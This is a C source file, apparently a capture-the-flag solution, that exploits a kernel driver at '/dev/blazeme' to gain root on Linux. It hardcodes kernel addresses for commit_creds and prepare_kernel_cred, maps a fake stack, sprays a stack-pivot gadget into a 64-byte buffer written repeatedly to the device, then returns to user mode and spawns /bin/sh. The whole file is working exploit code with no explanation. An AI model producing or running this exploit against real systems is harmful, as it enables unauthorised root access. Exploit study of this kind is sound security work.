#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>


static void shell();
static void kernel_payload();


int __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);
unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred);


static void escalate_privs() { commit_creds(prepare_kernel_cred(0)); }


unsigned long user_cs;
unsigned long user_ss;
unsigned long user_rflags;


unsigned long addr_fake_stack = 0x1740000;


static void save_state()
{
    __asm__ volatile(
            "movq %0, cs\n\t"
            "movq %1, ss\n\t"
            "pushfq\n\t"
            "popq %2"
            : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags)
            :
            : "memory"
            );
}


static void restore_state()
{
    __asm__ volatile(
            "swapgs\n\t"
            "movq [rsp+0x20], %0\n\t"
            "movq [rsp+0x18], %1\n\t"
            "movq [rsp+0x10], %2\n\t"
            "movq [rsp+0x08], %3\n\t"
            "movq [rsp+0x00], %4\n\t"
            "iretq\n\t"
            :
            : "r" (user_ss), "r" (addr_fake_stack), "r" (user_rflags), "r" (user_cs), "r" (shell)
            );
}


static void kernel_payload()
{
    escalate_privs();
    restore_state();
}


static void shell()
{
    printf("Spawning shell\n");
    system("/bin/sh");
    exit(0);
}


unsigned long mmap_addr = 0x1700000;

int main(void)
{
    commit_creds = (void *)0xffffffff81063960ULL;
    prepare_kernel_cred = (void *)0xffffffff81063b50ULL;
    save_state();

    // unsigned long *fake_stack = mmap((void *)0x1740000, 0x1000000, PROT_READ | PROT_WRITE | PROT_EXEC, 0x32 | MAP_POPULATE | MAP_FIXED, -1, 0);
    unsigned long *fake_stack = mmap((void *)mmap_addr, 0x1000000, PROT_READ | PROT_WRITE | PROT_EXEC, 0x32 | MAP_POPULATE | MAP_FIXED, -1, 0);
    if (!fake_stack) {
        printf("mmap failed\n");
        return 1;
    }

    fake_stack[(addr_fake_stack - mmap_addr) / 8] = (unsigned long)kernel_payload;

    unsigned long pivot[8];
    int i;
    for (i = 0; i < 8; ++i) {
        pivot[i] = 0xffffffff8109c604ULL;  // mov esp, 0x1740000; ret;
    }

    char payload[64];
    strncpy(payload, "AA", 2);
    strncpy(payload + 2, (const char *)pivot, 62);

    int fd = open("/dev/blazeme", O_RDWR);
    while (1) {
        write(fd, payload, 64);
    }

    return 0;
}
